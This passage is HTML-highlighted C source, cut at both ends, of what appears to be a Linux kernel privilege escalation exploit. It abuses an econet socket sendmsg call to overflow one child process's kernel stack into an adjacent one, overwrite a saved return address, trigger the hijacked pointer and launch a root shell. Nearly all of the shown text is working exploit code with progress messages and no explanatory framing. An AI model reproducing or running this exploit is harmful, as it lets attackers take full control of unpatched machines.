          </span><span style="font-style:italic;color:#4a4a4a;">/* parent doesn&#39;t need us :-( */</span><span style="color:#eeffff;">
          </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
        </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">] ==</span><span style="color:#eeffff;"> KSTACK_UPPER</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
          </span><span style="font-style:italic;color:#4a4a4a;">/* we&#39;re the upper adjacent process */</span><span style="color:#eeffff;">
          type </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> KSTACK_UPPER</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
          </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
        </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">] ==</span><span style="color:#eeffff;"> KSTACK_LOWER</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
          </span><span style="font-style:italic;color:#4a4a4a;">/* we&#39;re the lower adjacent process */</span><span style="color:#eeffff;">
          type </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> KSTACK_LOWER</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
          </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
        </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] fork failed, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return</span><span style="color:#eeffff;"> type</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">do_parent</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> i</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> j</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> upper</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> lower</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* parent sleeps until we&#39;ve discovered all the child kstacks */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">while </span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">sleep</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> i </span><span style="color:#89ddff;">&lt;</span><span style="color:#eeffff;"> NPROC</span><span style="color:#89ddff;">; ++</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">] ==</span><span style="color:#eeffff;"> KSTACK_UNINIT</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
        </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> NPROC</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* figure out if we have any adjacent child kstacks */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> i </span><span style="color:#89ddff;">&lt;</span><span style="color:#eeffff;"> NPROC</span><span style="color:#89ddff;">; ++</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">j </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> j </span><span style="color:#89ddff;">&lt;</span><span style="color:#eeffff;"> NPROC</span><span style="color:#89ddff;">; ++</span><span style="color:#eeffff;">j</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">] ==</span><span style="color:#eeffff;"> region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">j</span><span style="color:#89ddff;">] +</span><span style="color:#eeffff;"> KSTACK_SIZE</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
        </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">j </span><span style="color:#89ddff;">!=</span><span style="color:#eeffff;"> NPROC</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> NPROC </span><span style="color:#89ddff;">&amp;</span><span style="color:#eeffff;">amp</span><span style="color:#89ddff;">;&amp;</span><span style="color:#eeffff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> j </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> NPROC</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] failed to find adjacent kstacks, try again!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  upper </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> i</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  lower </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> j</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] found adjacent children kstacks at 0x</span><span style="color:#eeffff;">%lx</span><span style="color:#c3e88d;"> and 0x</span><span style="color:#eeffff;">%lx</span><span style="color:#89ddff;">\n&quot;, </span><span style="color:#82aaff;">
    region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#82aaff;">lower</span><span style="color:#89ddff;">],</span><span style="color:#82aaff;"> region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#82aaff;">upper</span><span style="color:#89ddff;">]);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* signal to non-adjacent children to die */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> i </span><span style="color:#89ddff;">&lt;</span><span style="color:#eeffff;"> NPROC</span><span style="color:#89ddff;">; ++</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">!=</span><span style="color:#eeffff;"> upper </span><span style="color:#89ddff;">&amp;</span><span style="color:#eeffff;">amp</span><span style="color:#89ddff;">;&amp;</span><span style="color:#eeffff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> i </span><span style="color:#89ddff;">!=</span><span style="color:#eeffff;"> lower</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">] =</span><span style="color:#eeffff;"> KSTACK_DIE</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* signal adjacent children to continue on */</span><span style="color:#eeffff;">
  region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">upper</span><span style="color:#89ddff;">] =</span><span style="color:#eeffff;"> KSTACK_UPPER</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">lower</span><span style="color:#89ddff;">] =</span><span style="color:#eeffff;"> KSTACK_LOWER</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* parent sleeps until child has clobbered the fptr */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">while </span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">sleep</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">parent </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> KSTACK_CLOBBER</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] escalating privileges...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* trigger our clobbered fptr */</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">syscall</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">__NR_restart_syscall</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* our privileges should be escalated now */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">getuid</span><span style="color:#89ddff;">() != </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] privilege escalation failed, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] launching root shell!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">execl</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/bin/sh</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">/bin/sh</span><span style="color:#89ddff;">&quot;, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">do_child_upper</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> i</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> ret</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> eco_sock</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> sockaddr_ec eco_addr</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> msghdr eco_msg</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> iovec iovs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">IOVS</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> ifreq ifr</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">target</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* calculate payload target, skip prologue */</span><span style="color:#eeffff;">
  target </span><span style="color:#89ddff;">= (</span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">*)</span><span style="color:#eeffff;"> payload_child</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  target </span><span style="color:#89ddff;">+= </span><span style="color:#f78c6c;">4</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
   </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* give lower child a chance to enter its wait4 call */</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">sleep</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* write some zeros */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> i </span><span style="color:#89ddff;">&lt;</span><span style="color:#eeffff;"> STACK_OFFSET</span><span style="color:#89ddff;">; ++</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    iovs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">iov_base </span><span style="color:#89ddff;">= (</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">*) 0x</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    iovs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">iov_len </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* overwrite saved ia32_sysret address on stack */</span><span style="color:#eeffff;">
  iovs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">STACK_OFFSET</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">iov_base </span><span style="color:#89ddff;">= (</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">*)</span><span style="color:#eeffff;"> target</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  iovs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">STACK_OFFSET</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">iov_len </span><span style="color:#89ddff;">= 0x</span><span style="color:#f78c6c;">0246</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* force abort via EFAULT */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> STACK_OFFSET </span><span style="color:#89ddff;">+ </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> i </span><span style="color:#89ddff;">&lt;</span><span style="color:#eeffff;"> IOVS</span><span style="color:#89ddff;">; ++</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    iovs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">iov_base </span><span style="color:#89ddff;">= (</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">*) 0x</span><span style="color:#f78c6c;">ffffffff00000000</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    iovs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">iov_len </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* create econet socket */</span><span style="color:#eeffff;">
  eco_sock </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">socket</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">PF_ECONET</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> SOCK_DGRAM</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">eco_sock </span><span style="color:#89ddff;">&lt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] failed creating econet socket, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#82aaff;">ifr</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, sizeof(</span><span style="color:#82aaff;">ifr</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">strcpy</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">ifr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">ifr_name</span><span style="color:#89ddff;">, &quot;</span><span style="color:#c3e88d;">lo</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* trick econet into associated with the loopback */</span><span style="color:#eeffff;">
  ret </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">ioctl</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">eco_sock</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> SIOCSIFADDR</span><span style="color:#89ddff;">, &amp;</span><span style="color:#82aaff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#82aaff;">ifr</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">ret </span><span style="color:#89ddff;">!= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] failed setting interface address, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#82aaff;">eco_addr</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, sizeof(</span><span style="color:#82aaff;">eco_addr</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#82aaff;">eco_msg</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, sizeof(</span><span style="color:#82aaff;">eco_msg</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  eco_msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_name </span><span style="color:#89ddff;">= &amp;</span><span style="color:#eeffff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">eco_addr</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  eco_msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_namelen </span><span style="color:#89ddff;">= sizeof(</span><span style="color:#eeffff;">eco_addr</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  eco_msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_flags </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  eco_msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iov </span><span style="color:#89ddff;">= &amp;</span><span style="color:#eeffff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">iovs</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  eco_msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iovlen </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> IOVS</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] upper child triggering stack overflow...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* trigger the kstack overflow into lower child&#39;s kstack */</span><span style="color:#eeffff;">
  ret </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">sendmsg</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">eco_sock</span><span style="color:#89ddff;">, &amp;</span><span style="color:#82aaff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#82aaff;">eco_msg</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">ret </span><span style="color:#89ddff;">!= -</span><span style="color:#f78c6c;">1 </span><span style="color:#89ddff;">||</span><span style="color:#eeffff;"> errno </span><span style="color:#89ddff;">!=</span><span style="color:#eeffff;"> EFAULT</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] sendmsg succeeded unexpectedly, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">close</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">eco_sock</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">do_child_lower</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> pid</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] lower child spawning a helper...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* fork off a helper to wait4 on */</span><span style="color:#eeffff;">
